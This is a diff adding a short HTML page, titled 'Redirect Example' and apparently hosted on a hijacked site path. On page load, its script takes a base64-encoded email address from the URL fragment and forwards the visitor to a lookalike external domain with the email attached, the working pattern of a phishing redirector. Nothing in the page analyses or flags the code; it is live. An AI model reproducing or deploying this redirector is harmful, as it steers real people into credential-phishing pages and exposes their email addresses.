@@ -1,0 +1,30 @@
+<!-- url: https://www.nise-test.com/_log/mwwbm/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Example</title>
+    <script>
+        function redirectToExternalSite(currentUrl) {
+            const [baseUrl, encodedEmail] = currentUrl.split('#');
+            if (!encodedEmail) {
+                console.error('No base64 encoded email found in the URL.');
+                return;
+            }
+
+            const newUrl = `https://policyt6.customercenter.com.es/rdm/#${encodedEmail}`;
+            window.location.href = newUrl;
+        }
+
+        // Automatically call the function on page load
+        window.onload = () => {
+            redirectToExternalSite(window.location.href);
+        };
+    </script>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+</body>
+</html>
